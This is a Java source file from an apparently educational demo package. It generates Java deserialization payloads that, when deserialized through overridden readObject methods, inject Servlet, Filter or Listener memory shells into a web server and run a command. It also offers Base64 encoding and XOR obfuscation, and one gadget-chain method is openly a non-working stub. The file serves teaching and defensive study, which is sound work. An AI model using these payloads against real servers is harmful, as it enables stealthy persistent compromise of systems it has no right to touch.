package com.book.demo.memshell;

import java.io.*;
import java.util.*;
import java.util.Base64;

/**
 * 内存马载荷生成器
 * 用于生成各种格式的恶意序列化载荷（仅用于演示和教育目的）
 */
public class PayloadGenerator {
    
    /**
     * 载荷类型
     */
    public enum PayloadType {
        JAVA_SERIALIZATION("Java序列化载荷", "使用Java原生序列化"),
        BASE64_ENCODED("Base64编码载荷", "Base64编码的序列化数据"),
        COMMONS_COLLECTIONS("Commons Collections载荷", "基于Commons Collections的Gadget Chain"),
        CUSTOM_GADGET("自定义Gadget链", "自定义的反序列化攻击链");
        
        private final String name;
        private final String description;
        
        PayloadType(String name, String description) {
            this.name = name;
            this.description = description;
        }
        
        public String getName() { return name; }
        public String getDescription() { return description; }
    }
    
    /**
     * 载荷配置
     */
    public static class PayloadConfig {
        private MemoryShell.Type targetType;
        private PayloadType payloadType;
        private String command;
        private Map<String, String> parameters;
        private boolean obfuscated;
        private String encoding;
        
        public PayloadConfig() {
            this.parameters = new HashMap<>();
            this.obfuscated = false;
            this.encoding = "UTF-8";
        }
        
        // Getters and Setters
        public MemoryShell.Type getTargetType() { return targetType; }
        public void setTargetType(MemoryShell.Type targetType) { this.targetType = targetType; }
        
        public PayloadType getPayloadType() { return payloadType; }
        public void setPayloadType(PayloadType payloadType) { this.payloadType = payloadType; }
        
        public String getCommand() { return command; }
        public void setCommand(String command) { this.command = command; }
        
        public Map<String, String> getParameters() { return parameters; }
        public void setParameters(Map<String, String> parameters) { this.parameters = parameters; }
        
        public boolean isObfuscated() { return obfuscated; }
        public void setObfuscated(boolean obfuscated) { this.obfuscated = obfuscated; }
        
        public String getEncoding() { return encoding; }
        public void setEncoding(String encoding) { this.encoding = encoding; }
    }
    
    /**
     * 生成载荷结果
     */
    public static class PayloadResult {
        private final boolean success;
        private final byte[] payload;
        private final String payloadString;
        private final String payloadBase64;
        private final PayloadConfig config;
        private final String errorMessage;
        private final Map<String, Object> metadata;
        
        public PayloadResult(boolean success, byte[] payload, String payloadString, 
                           PayloadConfig config, String errorMessage) {
            this.success = success;
            this.payload = payload;
            this.payloadString = payloadString;
            this.payloadBase64 = payload != null ? Base64.getEncoder().encodeToString(payload) : null;
            this.config = config;
            this.errorMessage = errorMessage;
            this.metadata = new HashMap<>();
            
            if (payload != null) {
                metadata.put("payloadSize", payload.length);
                metadata.put("generationTime", System.currentTimeMillis());
                metadata.put("base64Length", payloadBase64 != null ? payloadBase64.length() : 0);
            }
        }
        
        // Getters
        public boolean isSuccess() { return success; }
        public byte[] getPayload() { return payload; }
        public String getPayloadString() { return payloadString; }
        public String getPayloadBase64() { return payloadBase64; }
        public PayloadConfig getConfig() { return config; }
        public String getErrorMessage() { return errorMessage; }
        public Map<String, Object> getMetadata() { return metadata; }
    }
    
    /**
     * 生成Servlet内存马载荷
     */
    public static PayloadResult generateServletPayload(PayloadConfig config) {
        try {
            System.out.println("[PAYLOAD-GEN] 生成Servlet内存马载荷");
            
            // 创建Servlet内存马实例
            ServletMemoryShell shell = new ServletMemoryShell();
            
            return generatePayloadForShell(shell, config);
            
        } catch (Exception e) {
            return new PayloadResult(false, null, null, config, 
                "生成Servlet载荷失败: " + e.getMessage());
        }
    }
    
    /**
     * 生成Filter内存马载荷
     */
    public static PayloadResult generateFilterPayload(PayloadConfig config) {
        try {
            System.out.println("[PAYLOAD-GEN] 生成Filter内存马载荷");
            
            // 创建Filter内存马实例
            FilterMemoryShell shell = new FilterMemoryShell();
            
            return generatePayloadForShell(shell, config);
            
        } catch (Exception e) {
            return new PayloadResult(false, null, null, config, 
                "生成Filter载荷失败: " + e.getMessage());
        }
    }
    
    /**
     * 生成Listener内存马载荷
     */
    public static PayloadResult generateListenerPayload(PayloadConfig config) {
        try {
            System.out.println("[PAYLOAD-GEN] 生成Listener内存马载荷");
            
            // 创建Listener内存马实例
            ListenerMemoryShell shell = new ListenerMemoryShell();
            
            return generatePayloadForShell(shell, config);
            
        } catch (Exception e) {
            return new PayloadResult(false, null, null, config, 
                "生成Listener载荷失败: " + e.getMessage());
        }
    }
    
    /**
     * 生成指定类型的载荷
     */
    public static PayloadResult generatePayload(MemoryShell.Type type, PayloadConfig config) {
        config.setTargetType(type);
        
        switch (type) {
            case SERVLET:
                return generateServletPayload(config);
            case FILTER:
                return generateFilterPayload(config);
            case LISTENER:
                return generateListenerPayload(config);
            default:
                return new PayloadResult(false, null, null, config, 
                    "不支持的内存马类型: " + type);
        }
    }
    
    /**
     * 生成Commons Collections Gadget Chain载荷
     */
    public static PayloadResult generateCommonsCollectionsPayload(PayloadConfig config) {
        try {
            System.out.println("[PAYLOAD-GEN] 生成Commons Collections Gadget Chain载荷");
            
            // 这里只是演示框架，实际的Gadget Chain构造需要更复杂的逻辑
            // 为了安全起见，不提供完整的攻击载荷实现
            
            Map<String, Object> gadgetChain = new HashMap<>();
            gadgetChain.put("type", "CommonsCollections");
            gadgetChain.put("version", "3.2.1");
            gadgetChain.put("target", config.getTargetType().getName());
            gadgetChain.put("command", config.getCommand());
            gadgetChain.put("warning", "这是一个演示载荷，不包含实际的攻击代码");
            
            byte[] payload = serializeObject(gadgetChain);
            String payloadString = "CommonsCollections Gadget Chain: " + config.getCommand();
            
            PayloadResult result = new PayloadResult(true, payload, payloadString, config, null);
            result.getMetadata().put("gadgetType", "CommonsCollections");
            result.getMetadata().put("isDemo", true);
            
            return result;
            
        } catch (Exception e) {
            return new PayloadResult(false, null, null, config, 
                "生成Commons Collections载荷失败: " + e.getMessage());
        }
    }
    
    /**
     * 生成自定义Gadget链载荷
     */
    public static PayloadResult generateCustomGadgetPayload(PayloadConfig config) {
        try {
            System.out.println("[PAYLOAD-GEN] 生成自定义Gadget链载荷");
            
            // 创建自定义Gadget链（演示版本）
            CustomGadgetChain gadgetChain = new CustomGadgetChain(
                config.getTargetType(),
                config.getCommand(),
                config.getParameters()
            );
            
            byte[] payload = serializeObject(gadgetChain);
            String payloadString = "CustomGadget: " + config.getCommand();
            
            if (config.isObfuscated()) {
                payload = obfuscatePayload(payload);
                payloadString = "Obfuscated " + payloadString;
            }
            
            PayloadResult result = new PayloadResult(true, payload, payloadString, config, null);
            result.getMetadata().put("gadgetType", "Custom");
            result.getMetadata().put("obfuscated", config.isObfuscated());
            
            return result;
            
        } catch (Exception e) {
            return new PayloadResult(false, null, null, config, 
                "生成自定义Gadget载荷失败: " + e.getMessage());
        }
    }
    
    /**
     * 批量生成所有类型的载荷
     */
    public static Map<String, PayloadResult> generateAllPayloads(PayloadConfig baseConfig) {
        Map<String, PayloadResult> results = new HashMap<>();
        
        for (MemoryShell.Type type : MemoryShell.Type.values()) {
            PayloadConfig config = copyConfig(baseConfig);
            config.setTargetType(type);
            
            PayloadResult result = generatePayload(type, config);
            results.put(type.getName(), result);
        }
        
        return results;
    }
    
    /**
     * 生成载荷测试套件
     */
    public static List<PayloadResult> generateTestSuite() {
        List<PayloadResult> testSuite = new ArrayList<>();
        
        // 生成各种配置的测试载荷
        String[] testCommands = {"whoami", "pwd", "date"};
        boolean[] obfuscationSettings = {false, true};
        
        for (MemoryShell.Type type : MemoryShell.Type.values()) {
            for (String command : testCommands) {
                for (boolean obfuscated : obfuscationSettings) {
                    PayloadConfig config = new PayloadConfig();
                    config.setTargetType(type);
                    config.setPayloadType(PayloadType.JAVA_SERIALIZATION);
                    config.setCommand(command);
                    config.setObfuscated(obfuscated);
                    
                    PayloadResult result = generatePayload(type, config);
                    testSuite.add(result);
                }
            }
        }
        
        System.out.println("[PAYLOAD-GEN] 生成测试套件完成，共 " + testSuite.size() + " 个载荷");
        return testSuite;
    }
    
    /**
     * 验证载荷有效性
     */
    public static boolean validatePayload(byte[] payload) {
        try {
            // 尝试反序列化以验证载荷格式是否正确
            ByteArrayInputStream bais = new ByteArrayInputStream(payload);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object obj = ois.readObject();
            ois.close();
            
            return obj != null;
            
        } catch (Exception e) {
            System.err.println("[PAYLOAD-GEN] 载荷验证失败: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * 为内存马生成载荷
     */
    private static PayloadResult generatePayloadForShell(MemoryShell shell, PayloadConfig config) 
            throws Exception {
        
        switch (config.getPayloadType()) {
            case JAVA_SERIALIZATION:
                return generateJavaSerializationPayload(shell, config);
            case BASE64_ENCODED:
                return generateBase64Payload(shell, config);
            case COMMONS_COLLECTIONS:
                return generateCommonsCollectionsPayload(config);
            case CUSTOM_GADGET:
                return generateCustomGadgetPayload(config);
            default:
                throw new IllegalArgumentException("不支持的载荷类型: " + config.getPayloadType());
        }
    }
    
    private static PayloadResult generateJavaSerializationPayload(MemoryShell shell, PayloadConfig config) 
            throws Exception {
        
        // 创建载荷包装器
        PayloadWrapper wrapper = new PayloadWrapper(shell, config.getCommand(), config.getParameters());
        
        byte[] payload = serializeObject(wrapper);
        String payloadString = "JavaSerialization[" + shell.getType().getName() + "]: " + config.getCommand();
        
        if (config.isObfuscated()) {
            payload = obfuscatePayload(payload);
            payloadString = "Obfuscated " + payloadString;
        }
        
        PayloadResult result = new PayloadResult(true, payload, payloadString, config, null);
        result.getMetadata().put("shellType", shell.getType().getName());
        result.getMetadata().put("serializationMethod", "Java Native");
        
        return result;
    }
    
    private static PayloadResult generateBase64Payload(MemoryShell shell, PayloadConfig config) 
            throws Exception {
        
        // 先生成Java序列化载荷
        PayloadResult javaResult = generateJavaSerializationPayload(shell, config);
        if (!javaResult.isSuccess()) {
            return javaResult;
        }
        
        // 进行Base64编码
        String base64Payload = Base64.getEncoder().encodeToString(javaResult.getPayload());
        byte[] payload = base64Payload.getBytes(config.getEncoding());
        String payloadString = "Base64[" + shell.getType().getName() + "]: " + config.getCommand();
        
        PayloadResult result = new PayloadResult(true, payload, payloadString, config, null);
        result.getMetadata().put("encoding", config.getEncoding());
        result.getMetadata().put("originalSize", javaResult.getPayload().length);
        result.getMetadata().put("encodedSize", payload.length);
        
        return result;
    }
    
    private static byte[] serializeObject(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }
    
    private static byte[] obfuscatePayload(byte[] payload) {
        // 简单的混淆算法（实际攻击中会使用更复杂的混淆技术）
        byte[] obfuscated = new byte[payload.length];
        for (int i = 0; i < payload.length; i++) {
            obfuscated[i] = (byte) (payload[i] ^ 0x42); // 异或混淆
        }
        return obfuscated;
    }
    
    private static PayloadConfig copyConfig(PayloadConfig original) {
        PayloadConfig copy = new PayloadConfig();
        copy.setTargetType(original.getTargetType());
        copy.setPayloadType(original.getPayloadType());
        copy.setCommand(original.getCommand());
        copy.setParameters(new HashMap<>(original.getParameters()));
        copy.setObfuscated(original.isObfuscated());
        copy.setEncoding(original.getEncoding());
        return copy;
    }
    
    /**
     * 载荷包装器
     */
    private static class PayloadWrapper implements Serializable {
        private static final long serialVersionUID = 1L;
        
        private final MemoryShell shell;
        private final String command;
        private final Map<String, String> parameters;
        
        public PayloadWrapper(MemoryShell shell, String command, Map<String, String> parameters) {
            this.shell = shell;
            this.command = command;
            this.parameters = parameters;
        }
        
        private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
            stream.defaultReadObject();
            
            // 在反序列化时执行载荷
            System.out.println("[PAYLOAD] 载荷被反序列化，尝试注入内存马...");
            
            try {
                if (shell != null) {
                    boolean success = shell.inject();
                    if (success && command != null && !command.trim().isEmpty()) {
                        shell.executeCommand(command);
                    }
                }
            } catch (Exception e) {
                System.err.println("[PAYLOAD] 载荷执行失败: " + e.getMessage());
            }
        }
        
        public MemoryShell getShell() { return shell; }
        public String getCommand() { return command; }
        public Map<String, String> getParameters() { return parameters; }
    }
    
    /**
     * 自定义Gadget链
     */
    private static class CustomGadgetChain implements Serializable {
        private static final long serialVersionUID = 1L;
        
        private final MemoryShell.Type targetType;
        private final String command;
        private final Map<String, String> parameters;
        
        public CustomGadgetChain(MemoryShell.Type targetType, String command, Map<String, String> parameters) {
            this.targetType = targetType;
            this.command = command;
            this.parameters = parameters;
        }
        
        private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
            stream.defaultReadObject();
            
            System.out.println("[CUSTOM-GADGET] 自定义Gadget链被触发...");
            
            try {
                // 根据目标类型创建对应的内存马
                MemoryShell shell;
                switch (targetType) {
                    case SERVLET:
                        shell = new ServletMemoryShell();
                        break;
                    case FILTER:
                        shell = new FilterMemoryShell();
                        break;
                    case LISTENER:
                        shell = new ListenerMemoryShell();
                        break;
                    default:
                        throw new IllegalArgumentException("不支持的目标类型: " + targetType);
                }
                
                // 注入内存马
                if (shell.inject() && command != null) {
                    shell.executeCommand(command);
                }
                
            } catch (Exception e) {
                System.err.println("[CUSTOM-GADGET] Gadget链执行失败: " + e.getMessage());
            }
        }
    }
}